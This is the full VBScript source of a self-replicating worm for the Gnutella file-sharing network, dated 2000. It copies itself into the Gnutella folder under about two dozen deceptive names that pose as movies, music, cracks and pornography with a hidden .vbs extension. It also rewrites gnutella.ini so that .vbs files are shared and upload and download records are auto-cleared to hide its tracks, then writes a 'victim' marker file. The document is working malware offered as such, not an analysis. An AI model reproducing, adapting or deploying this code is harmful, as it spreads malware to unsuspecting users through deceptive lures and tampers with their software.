Option Explicit
Dim CurrentFilename, CurrentGeneration, InfectionDate
CurrentFilename = "PamelaAndersonmovie.mov.vbs"
CurrentGeneration = 7
InfectionDate = "7/31/00, 1:42:11 AM"
const ProgramName = "Gnutella Worm v1.2 By LeGaLiZeBuDz"
const ProgramDate = "2000 May 28. The first v1.2 Gnutella Worm."
' Watching CurrentGeneration will be quite interesting. I wonder if
' anyone ever studied this compared with real viral spreading.
' Version History:
'  1.2  o Following Enhancements:
'       o Now Sets INI to remove completed uploads and downloads, covers my tracks while searching for Victims.
'       o Re-Coded for better performance while editing ini and victim files.
'
'  1.1  o Now copies itself to a list of target keyword instead of just current filename
'       o Fixed a bug with Ini path... (1.0 didn't work at all. he he.)
'
'  1.0  o Initial Release
'
' Behavior Control Parameters
Dim NewFilenames, GnutellaPath, GnutellaIni, VictimFilename
NewFilenames    = Array(ProgramName & ".vbs", "JennaJamesonmovie.asf.vbs", "PamelaAndersonmovie.mov.vbs", "AsiaCarerramovie.avi.vbs", "xxxFTPmovie.mov.vbs", "ASFCompressor(Noqualityloss).zip.vbs", "collegesex.jpg.vbs", "Gladiator.jpg.vbs", "Battlefield Earth.asf.vbs", "Evangelioncompleteepisodesscripts.txt.vbs", "ScanMaster.jpg.vbs", "How to eat pussy.avi.vbs", "AliciaSilverstone.jpg.vbs", "PearlJam.mp3.vbs", "Mp3compressor(Halfthesizebutsamequality).zip.vbs", "NapsterMetallicaCrack.zip.vbs", "Santana.mp3.vbs", "NSync.mp3.vbs", "Nirvana.mp3.vbs", "ShaniaTwain.mp3.vbs", "Jesuslovesyou.txt.vbs", "GnutellaUpgrade.zip.vbs", "OFFICIALGnutellaOptionPack.ZIP.vbs", "AssFucking Collage Teens 15 Girls.asf.vbs")
GnutellaPath    = "C:\Program Files\gnutella\"
GnutellaIni     = GnutellaPath + "gnutella.ini"
VictimFilename  = "LeGaLiZeBuDz-Gnutella-Worm-v1.2"                 ' (Gnutella Worm Victim :)
Const ForReading = 1
Const ForWriting = 2
Dim fso, SourceFile, DestinationFile, NewFilename, VictimName
Function ModifyAndCopy
' Change Header data (New name, Generation number, any info passed down to the next Generation)
  DestinationFile.WriteLine(SourceFile.ReadLine)
  DestinationFile.WriteLine(SourceFile.ReadLine)
  DestinationFile.WriteLine("CurrentFilename = """ & NewFilename & """")
  DestinationFile.WriteLine("CurrentGeneration = " & (CurrentGeneration + 1))
  DestinationFile.WriteLine("InfectionDate = """ & Date & ", " & Time & """")
  SourceFile.ReadLine ' Skip the ones we just wrote changed.
  SourceFile.Readline
  SourceFile.Readline
' Copy the rest of the file as-is
  Do While Not SourceFile.AtEndOfStream
    DestinationFile.WriteLine(SourceFile.ReadLine)
  Loop
End Function
Function ProcessIni
  Dim IniFile, IniFileDest, Line, DL, UL
  Set IniFile = fso.OpenTextFile(GnutellaIni, ForReading)
  Set IniFileDest = fso.CreateTextFile(GnutellaIni + "_", ForWriting)
  DL = 0
  UL = 0
  Do While Not IniFile.AtEndOfStream
    Line = IniFile.ReadLine
    If Left(Line, 8) = "extlist=" Then
      IniFileDest.WriteLine(Line + ";vbs")
    ElseIf Left(Line, 13) = "databasepath=" Then
      IniFileDest.WriteLine(Line + ";" + GnutellaPath)
    ElseIf Left(Line, 12) = "clientid128=" Then
      VictimName = Mid(Line, 13)
      IniFileDest.WriteLine(Line)
    ElseIf Left(Line, 12) = "autocleardl=" Then
      IniFileDest.WriteLine("autocleardl=1")
      DL = 1
    ElseIf Left(Line, 12) = "autoclearul=" Then
      IniFileDest.WriteLine("autoclearul=1")
      UL = 1
    Else
      IniFileDest.WriteLine(Line)
    End If
  Loop
  If DL = 0 Then IniFileDest.WriteLine("autocleardl=1")
  If UL = 0 Then IniFileDest.WriteLine("autoclearul=1")
  IniFileDest.Close
  IniFile.Close
  fso.DeleteFile(GnutellaIni)
  fso.MoveFile GnutellaIni + "_", GnutellaIni
End Function
Function SignalVictim
  Dim Victim
  Dim Line
  Dim SignatureFilename
  SignatureFilename = GnutellaPath & VictimFilename & VictimName & ".zip"
  Set Victim = fso.CreateTextFile(SignatureFilename, ForWriting)
  Victim.WriteLine("Generation #: " & CurrentGeneration)
  Victim.WriteLine("Victim ID: " & VictimName)
  Victim.WriteLine("Infection date: " & InfectionDate)
  Victim.WriteLine("Thanks, Guinnea Pig!.")
  Victim.Close
End Function
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FolderExists(GnutellaPath) Then
  For Each NewFilename in NewFilenames
    Set DestinationFile = fso.CreateTextFile(GnutellaPath + NewFilename, True)
    Set SourceFile = fso.OpenTextFile(CurrentFilename, ForReading)
    ModifyAndCopy
    SourceFile.Close
    DestinationFile.Close
  Next
  ProcessIni
  SignalVictim
End If
fso.DeleteFile(CurrentFilename)
